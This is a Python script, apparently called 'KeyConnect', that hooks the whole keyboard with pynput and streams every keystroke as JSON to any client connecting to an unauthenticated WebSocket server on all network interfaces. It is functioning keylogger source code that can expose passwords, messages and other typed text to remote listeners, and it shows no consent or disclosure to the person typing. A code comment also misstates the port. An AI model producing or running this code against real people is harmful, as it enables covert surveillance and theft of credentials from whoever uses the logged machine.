import asyncio
import websockets
import json
from pynput import keyboard

# Keep track of connected clients
connected = set()

async def handle_connection(websocket):
    # Register client
    connected.add(websocket)
    print(f"[+] Client connected. Total clients: {len(connected)}")
    
    try:
        # Keep connection open
        await websocket.wait_closed()
    finally:
        connected.remove(websocket)
        print(f"[-] Client disconnected. Total clients: {len(connected)}")

async def send_keypress(key_char):
    if connected:
        message = json.dumps({"key": key_char})
        disconnected = set()
        
        for websocket in connected:
            try:
                await websocket.send(message)
            except websockets.exceptions.ConnectionClosed:
                disconnected.add(websocket)
        
        # Remove disconnected clients
        for websocket in disconnected:
            if websocket in connected:
                connected.remove(websocket)
                print(f"[-] Removed disconnected client. Total clients: {len(connected)}")

def on_press(key):
    try:
        # Convert key press to character
        if hasattr(key, 'char') and key.char:
            key_char = key.char
        else:
            # Handle special keys
            key_name = str(key).replace('Key.', '')
            special_keys = {
                'space': ' ',
                'enter': '\n',
                'backspace': '<backspace>',
                'tab': '\t'
            }
            key_char = special_keys.get(key_name, f'<{key_name}>')
            
        print(f"[*] Pressed: {key_char}")
        
        # Send to WebSocket clients
        asyncio.run_coroutine_threadsafe(send_keypress(key_char), loop)
        
    except Exception as e:
        print(f"[!] Error sending key: {e}")

async def main():
    # Configure server
    host = "0.0.0.0"
    port = 8000  # Using port 8001 (8000 + 1)
    
    print(f"[*] Starting KeyConnect WebSocket Server on {host}:{port}")
    print(f"[*] Press Ctrl+C to stop the server")
    
    # Start WebSocket server
    async with websockets.serve(handle_connection, host, port):
        print(f"[+] WebSocket server listening on ws://{host}:{port}")
        await asyncio.Future()  # Run forever

if __name__ == "__main__":
    # Create event loop
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    # Start keyboard listener in a thread
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    
    try:
        # Run WebSocket server in the main thread
        loop.run_until_complete(main())
    except KeyboardInterrupt:
        print("\n[*] Server shutting down...")
    finally:
        loop.close()